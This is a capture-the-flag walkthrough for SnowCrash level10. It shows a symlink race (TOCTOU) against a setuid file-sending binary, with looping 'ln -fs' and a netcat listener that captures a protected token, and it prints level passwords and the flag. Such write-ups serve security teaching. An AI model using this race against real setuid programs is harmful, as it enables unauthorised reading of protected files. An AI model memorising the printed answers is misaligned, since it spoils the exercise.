## level10
```
flag09@SnowCrash:~$ su level10
Password: s5cAJpM8ev6XHw998pRWG728z
level10@SnowCrash:~$
```
```
level10@SnowCrash:~$ ll
total 28
dr-xr-x---+ 1 level10 level10   140 Mar  6  2016 ./
d--x--x--x  1 root    users     340 Aug 30  2015 ../
-r-x------  1 level10 level10   220 Apr  3  2012 .bash_logout*
-r-x------  1 level10 level10  3518 Aug 30  2015 .bashrc*
-rwsr-sr-x+ 1 flag10  level10 10817 Mar  5  2016 level10*
-r-x------  1 level10 level10   675 Apr  3  2012 .profile*
-rw-------  1 flag10  flag10     26 Mar  5  2016 token
```
```
level10@SnowCrash:~$ ./level10 
./level10 file host
        sends file to host if you have access to it
level10@SnowCrash:~$ cat token 
cat: token: Permission denied
```
```
level10@SnowCrash:~$ ./level10 .bashrc 0.0.0.0
Connecting to 0.0.0.0:6969 .. Unable to connect to host 0.0.0.0
```
i use `tmux` for multi windows  
`0.0.0.0:6969` we will be listen this port with  help `nc`
```
nc -l 6969
```
create file for test connection 
```
echo Hello! > /tmp/test
./level10 /tmp/test 0.0.0.0
```
```
level10@SnowCrash:~$ nc -l 6969
.*( )*.
hello!
```
create link for `token`
```
level10@SnowCrash:~$ ./level10 /tmp/link 0.0.0.0
You don't have access to /tmp/link
```
open three windows in `tmux`
```
level10@SnowCrash:~$ while true; do ln -fs ~/level10 /tmp/exploit; ln -fs ~/token /tmp/exploit; done
```
```
nc -l 6969
```
```
level10@SnowCrash:~$ while true; do ./level10 /tmp/exploit 0.0.0.0; done
```
```
level10@SnowCrash:~$ nc -l 6969
.*( )*.
woupa2yuojeeaaed06riuj63c
```
```
level10@SnowCrash:~$ su flag10
Password: woupa2yuojeeaaed06riuj63c
Don't forget to launch getflag !
```
```
flag10@SnowCrash:~$ getflag
Check flag.Here is your token : feulo4b72j7edeahuete3no7c
```
